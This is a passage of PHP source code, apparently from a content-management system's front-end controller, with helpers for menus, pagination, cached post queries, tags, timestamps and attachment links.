                $xiaotuming = str_replace('.','_small.',$tuArr[$lastk]);
                $tuArr[$lastk] = $datuming;
                $datu = implode('/',$tuArr);
                $tuArr[$lastk] = $xiaotuming;
                $xiaotu = implode('/',$tuArr);
                foreach($tuArr as $tkey => $tu)
                {
                    if($tu == 'data' && $tuArr[$tkey + 1] == 'uploads')
                    {
                        break;
                    }
                    else
                    {
                        unset($tuArr[$tkey]);
                    }
                }
                $tupath = implode('/',$tuArr);
                if(is_file(ROOT_PATH.$tupath))
                {
                    $data['xiaotu'] = $xiaotu;
                }
                $tuArr[$lastk] = $datuming;
                $tupath = implode('/',$tuArr);
                if(is_file(ROOT_PATH.$tupath))
                {
                    $data['datu'] = $datu;
                }
            }
        }
        return $data;
    }
    protected function filterdm($domain)
    {
        $dm = $_SERVER['HTTP_HOST'];
        $dmtmp = str_replace(['http://','https://'],'',$domain);
        $dmtmp = trim($dmtmp,'/');
        $dmarr = explode('/',$dmtmp);
        $dmtmp = $dmarr[0];
        if(stripos($dm,'www.') === false && stripos($dmtmp,'www.') !== false && $dmtmp == 'www.'.$dm)
        {
            $domain = str_replace('www.','',$domain);
        }
        elseif(stripos($dmtmp,'www.') === false && stripos($dm,'www.') !== false && $dm == 'www.'.$dmtmp)
        {
            $domain = str_replace('://','://www.',$domain);
        }
        return $domain;
    }
    private function getBootstrapf($arr,$pageUrl)
    {
        $re = '';
        foreach($arr as $key => $val)
        {
            $act = '';
            if($pageUrl == $val['href']){
                $act = ' active';
            }
            if(isset($val['children'])){
                $children = '';
                foreach($val['children'] as $ckey => $cval)
                {
                    $cactive = '';
                    if($pageUrl == $cval['href']){
                        $cactive = ' active';
                    }
                    $children .= '<a class="dropdown-item'.$cactive.'" href="'.$cval['href'].'" target="'.$cval['target'].'">'.$cval['icon'].$cval['label'].'</a>';
                }
                $re .= '<li class="nav-item dropdown'.$act.'"><a href="'.$val['href'].'" class="nav-link dropdown-toggle" data-toggle="dropdown" target="'.$val['target'].'">'.(empty($val['icon'])?'':$val['icon'].'&nbsp;').$val['label'].'</a><div class="dropdown-menu">'.$children.'</div></li>';
            }
            else{
                $re .= '<li class="nav-item'.$act.'"><a class="nav-link" href="'.$val['href'].'" target="'.$val['target'].'">'.(empty($val['icon'])?'':$val['icon'].'&nbsp;').$val['label'].'</a></li>';
            }
        }
        return $re;
    }
    protected function pagef($page)
    {
        if(is_null($page)){
            $page = '';
        }
        $re = str_replace(['<li>','<a href='],['<li class="page-item">','<a class="page-link" href='],$page);
        $re = str_replace(['<span>','</span>','<li class="active">','<li class="disabled">'],['<a class="page-link" href="#!"><span>','</span></a>','<li class="page-item active">','<li class="page-item disabled">'],$re);
        return $re;
    }
    protected function pagefc($page)
    {
        if(is_null($page)){
            $page = '';
        }
        $re = str_replace('<ul class="pagination">','<ul class="pagination justify-content-center">',$page);
        return $re;
    }
    protected function pagefr($page)
    {
        if(is_null($page)){
            $page = '';
        }
        $re = str_replace('<ul class="pagination">','<ul class="pagination justify-content-end">',$page);
        return $re;
    }
    private function isLocalImage($imgurl)
    {
        $dm = $this->domain();
        if(substr($dm,0,4) == 'http'){
            $dmarr = explode('://', $dm);
            $dm = $dmarr[1];
        }
        if(substr($dm,0,4) == 'www.'){
            $dm = substr($dm,4);
        }
        if(stripos($imgurl, $dm) === false){
            return false;
        }
        return true;
    }
    private function whichgroup($slid, $slideArr)
    {
        $group = '';
        foreach($slideArr as $key => $val){
            if(strpos(','.$val['sid'].',', ','.$slid.',') !== false){
                $group = $key;
                break;
            }
        }
        return $group;
    }
    protected function pages4($pages)
    {
        $this->assign('simpages', $this->simplifiedPagination($pages));
        $page4 =$this->pagef($pages);
        $this->assign('pages4', $page4);
        $this->assign('pages4l', $page4);
        $this->assign('pages4c', $this->pagefc($page4));
        $this->assign('pages4r', $this->pagefr($page4));
        $this->assign('simpages4', $this->simplifiedPagination($page4));
        $this->assign('simpages4c', $this->simplifiedPagination($this->pagefc($page4)));
    }
    protected function pjaxout($page)
    {
        if(substr($page, -5) != '.html' && substr($page, -4) != '.htm'){
            $page = $page . '.html';
        }
        if(Request::instance()->isMobile() && is_file(APP_PATH.'../public/'.$this->template.'/pjax/mobile/'.$page))
        {
            $htmls = $this->fetch(APP_PATH.'../public/'.$this->template.'/pjax/mobile/'.$page);
        }
        elseif(is_file(APP_PATH.'../public/'.$this->template.'/pjax/'.$page))
        {
            $htmls = $this->fetch(APP_PATH.'../public/'.$this->template.'/pjax/'.$page);
        }
        else{
            $htmls = '';
        }
        return $htmls;
    }
    protected function timedif($oldtime)
    {
        $oldtime = strtotime($oldtime);
        $dif = time() - $oldtime;
        if($dif < 60){
            $dif = $dif.Lang::get(' seconds ago');
        }
        elseif($dif < 3600){
            $dif = intval($dif / 60).Lang::get(' minutes ago');
        }
        elseif($dif < 86400){
            $dif = intval($dif / 3600).Lang::get(' hours ago');
        }
        elseif($dif > 31622400){
            $dif = intval(date('Y') - date('Y', $oldtime)).Lang::get(' years ago');
        }
        else{
            $dif = intval($dif / 86400).Lang::get(' days ago');
        }
        return $dif;
    }
    protected function decotime($date)
    {
        $tmptm = date('Y-m-d-H-i-s',strtotime($date));
        $tmparr = explode('-',$tmptm);
        return [
            'nian' => $tmparr[0],
            'yue' => $tmparr[1],
            'ri' => $tmparr[2],
            'shi' => $tmparr[3],
            'fen' => $tmparr[4],
            'miao' => $tmparr[5]
        ];
    }
    private function paihang()
    {
        $paihang = Cache::get('paihang'.'_'.$this->lang);
        if($paihang === false)
        {
            $paihang = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                ->where('post_status','=',1)
                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                ->where('status','=',1)
                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                ->order('post_hits desc,post_like desc')
                ->limit(50)
                ->select();
            $paihang = $this->addLargerPicture($this->addArticleHref($paihang));
            Cache::set('paihang'.'_'.$this->lang,$paihang,3600);
        }
        $paihang['lang'] = $this->lang;
        Hook::add('filter_paihang',$this->plugins);
        Hook::listen('filter_paihang',$paihang,$this->ccc);
        unset($paihang['lang']);
        return $paihang;
    }
    private function gettu($content)
    {
        $reArr = [];
        preg_match_all('/<img [\s\S]+?>/i', $content, $matches);
        if(is_array($matches[0]) && count($matches[0]) > 0){
            foreach($matches[0] as $key => $val){
                preg_match('/src="(\S+?)"/i', $val, $submatches);
                if(isset($submatches[1])){
                    $reArr['tu'][] = $submatches[1];
                }
            }
        }
        if(!isset($reArr['tu'])){
            $reArr['tu'] = [];
        }
        $reArr['shuliang'] = count($reArr['tu']);
        return $reArr;
    }
    private function getag()
    {
        $tags = Cache::get('tags_front');
        if($tags === false){
            $tagsArr = [];
            $tagsdata = db('posts')->where('post_type', '<>', 1)->where('post_status','=',1)->where('status','=',1)->where('post_date','<= time',date('Y-m-d H:i:s'))->field('post_keywords')->order('post_hits desc,post_like desc')->limit(100)->select();
            if(!empty($tagsdata)){
                $stop = false;
                foreach($tagsdata as $val){
                    if(!empty($val['post_keywords'])){
                        $tarr = explode(',', $val['post_keywords']);
                        foreach($tarr as $tval){
                            $tval = trim($tval);
                            $max_number = 50;
                            $max_len = 18;
                            if(preg_match('/^[\x{4e00}-\x{9fa5}]+$/u', $tval)>0){
                                $max_len = 8;
                            }
                            if(mb_strlen($tval,'utf8') < $max_len && !in_array($tval, $tagsArr)){
                                $tagsArr[] = $tval;
                            }
                            if(count($tagsArr) >= $max_number){
                                $stop = true;
                                break;
                            }
                        }
                        if($stop == true){
                            break;
                        }
                    }
                }
            }
            $tags = [];
            foreach($tagsArr as $key => $val){
                $tags[] = [
                    'biaoqian' => $val,
                    'href' => Url::build('/find/'.urlencode($val))
                ];
            }
            Cache::set('tags_front',$tags,3600);
        }
        return $tags;
    }
    private function toutiao()
    {
        $toutiao = Cache::get('toutiao_front');
        if($toutiao === false){
            $id = Operc::getc('toutiao');
            if(!empty($id)){
                $toutiao = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_source as laiyuan,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                    ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                    ->where('posts.id',$id)
                    ->where('post_type', '<>', 1)
                    ->where('post_status','=',1)
                    ->where('status','=',1)
                    ->where('post_date','<= time',date('Y-m-d H:i:s'))
                    ->find();
            }
            else{
                $time = date('Y-m-d') . ' 00:00:00';
                $toutiao = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_source as laiyuan,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                    ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                    ->where('post_type', '<>', 1)
                    ->where('post_status','=',1)
                    ->where('status','=',1)
                    ->where('post_date','<= time',date('Y-m-d H:i:s'))
                    ->where('post_modified','> time',$time)
                    ->order('post_modified asc')
                    ->limit(1)
                    ->find();
                if(empty($toutiao)){
                    $toutiao = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_source as laiyuan,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                        ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                        ->where('post_type', '<>', 1)
                        ->where('post_status','=',1)
                        ->where('status','=',1)
                        ->where('post_date','<= time',date('Y-m-d H:i:s'))
                        ->order('post_modified desc')
                        ->limit(1)
                        ->find();
                }
            }
            if(!empty($toutiao)){
                if(isset($toutiao['fabushijian']))
                {
                    $toutiao['shijiancha'] = $this->timedif($toutiao['fabushijian']);
                    $toutiao['date'] = $this->decotime($toutiao['fabushijian']);
                    if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']))
                    {
                        $toutiao['fabushijian'] = date($this->options_spare['timeFormat'],strtotime($toutiao['fabushijian']));
                    }
                }
                if(isset($toutiao['shoufashijian']))
                {
                    $toutiao['shoufa']['shijiancha'] = $this->timedif($toutiao['shoufashijian']);
                    $toutiao['shoufa']['date'] = $this->decotime($toutiao['shoufashijian']);
                    if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']))
                    {
                        $toutiao['shoufashijian'] = date($this->options_spare['timeFormat'],strtotime($toutiao['shoufashijian']));
                    }
                }
                $toutiao['href'] = Url::build('/article/'.$toutiao['id']);
                $toutiao['zuozhehref'] = Url::build('/author/'.$toutiao['author']);
                $toutiao = $this->addLargerPictureInOneDim($toutiao);
                $toutiao['tupianzu'] = $this->gettu($toutiao['zhengwen']);
            }
            Cache::set('toutiao_front',$toutiao,3600);
        }
        return $toutiao;
    }
    private function zhuyemian()
    {
        $zhuyemian = Cache::get('zhuyemian_front');
        if($zhuyemian === false){
            $id = Operc::getc('zhuyemian');
            if(!empty($id)){
                $zhuyemian = Db::name('posts')
                    ->where('id',$id)
                    ->where('post_type', 1)
                    ->where('post_status','=',1)
                    ->where('status','=',1)
                    ->where('post_date','<= time',date('Y-m-d H:i:s'))
                    ->field('id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,thumbnail as suolvetu')
                    ->find();
            }
            else{
                $zhuyemian = Db::name('posts')
                    ->where('post_type', 1)
                    ->where('post_status','=',1)
                    ->where('status','=',1)
                    ->where('post_date','<= time',date('Y-m-d H:i:s'))
                    ->field('id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,thumbnail as suolvetu')
                    ->order('post_modified desc')
                    ->limit(1)
                    ->find();
            }
            if(!empty($zhuyemian)){
                if(isset($zhuyemian['fabushijian']))
                {
                    $zhuyemian['shijiancha'] = $this->timedif($zhuyemian['fabushijian']);
                    $zhuyemian['date'] = $this->decotime($zhuyemian['fabushijian']);
                    if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']))
                    {
                        $zhuyemian['fabushijian'] = date($this->options_spare['timeFormat'],strtotime($zhuyemian['fabushijian']));
                    }
                }
                if(isset($zhuyemian['shoufashijian']))
                {
                    $zhuyemian['shoufa']['shijiancha'] = $this->timedif($zhuyemian['shoufashijian']);
                    $zhuyemian['shoufa']['date'] = $this->decotime($zhuyemian['shoufashijian']);
                    if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']))
                    {
                        $zhuyemian['shoufashijian'] = date($this->options_spare['timeFormat'],strtotime($zhuyemian['shoufashijian']));
                    }
                }
                $zhuyemian['href'] = Url::build('/page/'.$zhuyemian['id']);
                $zhuyemian['zuozhehref'] = Url::build('/author/'.$zhuyemian['author']);
                $zhuyemian = $this->addLargerPictureInOneDim($zhuyemian);
                $zhuyemian['tupianzu'] = $this->gettu($zhuyemian['zhengwen']);
            }
            Cache::set('zhuyemian_front',$zhuyemian,3600);
        }
        return $zhuyemian;
    }
    private function addMenuActive(&$menu, $pageUrl, &$ks = null, $record = true, $stop = false)
    {
        foreach($menu as $key => $val){
            if($record == true && $stop == false){
                $ks = $key;
            }
            if($val['href'] == $pageUrl){
                $menu[$key]['active'] = 1;
                $stop = true;
            }
            else{
                $menu[$key]['active'] = 0;
            }
            if(isset($val['children'])){
                $stop = $this->addMenuActive($menu[$key]['children'], $pageUrl, $ks, false, $stop);
            }
        }
        return $stop;
    }
    protected function wenpai($gjzarr)
    {
        $wenpai = [
            'name' => '',
            'href' => ''
        ];
        if(is_array($gjzarr) && count($gjzarr) > 0){
            foreach($gjzarr as $key => $val){
                if(!isset($wenpai['name'])){
                    $wenpai['name'] = $val['name'];
                    $wenpai['href'] = $val['href'];
                }
                else{
                    if(mb_strlen($val['name']) < mb_strlen($wenpai['name'])){
                        $wenpai['name'] = $val['name'];
                        $wenpai['href'] = $val['href'];
                    }
                }
            }
        }
        return $wenpai;
    }
    protected function shangyiyexiayiye($dangqianye, $zongyeshu, $url)
    {
        $urlArr = explode('/', trim($url));
        array_pop($urlArr);
        $tmpArr = explode('/', trim($_SERVER['PHP_SELF']));
        $url = implode('/', $urlArr) . '/' . end($tmpArr);
        $shangyiye = '';
        $xiayiye = '';
        $querystr = '';
        $getArr = Request::instance()->get();
        foreach($getArr as $key => $val){
            if($key != 'page'){
                $querystr .= empty($querystr) ? $key . '=' . $val : '&' . $key . '=' . $val;
            }
        }
        if($dangqianye == 1 && $zongyeshu > 1){
            $querystring = empty($querystr) ? 'page=2' : $querystr . '&page=2';
            $xiayiye = $url . '?' . $querystring;
        }
        elseif($dangqianye == $zongyeshu && $zongyeshu > 1){
            $shangyiye = $zongyeshu - 1;
            $querystring = empty($querystr) ? 'page=' . $shangyiye : $querystr . '&page=' . $shangyiye;
            $shangyiye = $url . '?' . $querystring;
        }
        elseif($dangqianye > 1 && $dangqianye < $zongyeshu){
            $shangyiye = $dangqianye - 1;
            $querystring = empty($querystr) ? 'page=' . $shangyiye : $querystr . '&page=' . $shangyiye;
            $shangyiye = $url . '?' . $querystring;
            $xiayiye = $dangqianye + 1;
            $querystring = empty($querystr) ? 'page=' . $xiayiye : $querystr . '&page=' . $xiayiye;
            $xiayiye = $url . '?' . $querystring;
        }
        return [
            'shangyiye' => $shangyiye,
            'xiayiye' => $xiayiye
        ];
    }
    protected function fujian($fujian, $fujianurl)
    {
        $reArr = [];
        if(!empty($fujian)){
            $fujianArr = explode('|', $fujian);
            foreach($fujianArr as $val){
                $tmpArr = explode(':', $val);
                $reArr[] = [
                    'fujianming' => $tmpArr[1],
                    'dizhi' => $this->domain() . $tmpArr[0],
                    'kuozhanming' => pathinfo($tmpArr[1], PATHINFO_EXTENSION)
                ];
            }
        }
        if(!empty($fujianurl)){
            $fujianurl = str_replace(["\r\n", "\r", "\n"], ',', $fujianurl);
            $fujianurlArr = explode(',', $fujianurl);
            foreach($fujianurlArr as $val){
                $val = trim($val);
                if(!empty($val)){
                    $bval = basename($val);
                    $reArr[] = [
                        'fujianming' => $bval,
                        'dizhi' => $val,
                        'kuozhanming' => pathinfo($bval, PATHINFO_EXTENSION)
                    ];
                }
            }
        }
        return $reArr;
    }
    protected function istoday($time)
    {
        if(date('Y-m-d') == date('Y-m-d',strtotime($time))){
            return 1;
        }
        return 0;
    }
    protected function isoneday($time)
    {
        if(time() - strtotime($time) < 86400){
            return 1;
        }
        return 0;
    }
    protected function simplifiedPagination($pagination)
    {
        if(is_null($pagination)){
            $pagination = '';
        }
        return substr($pagination, 0, strpos($pagination, '</li>') + 5) . substr($pagination, strrpos($pagination,'<li'));
    }
}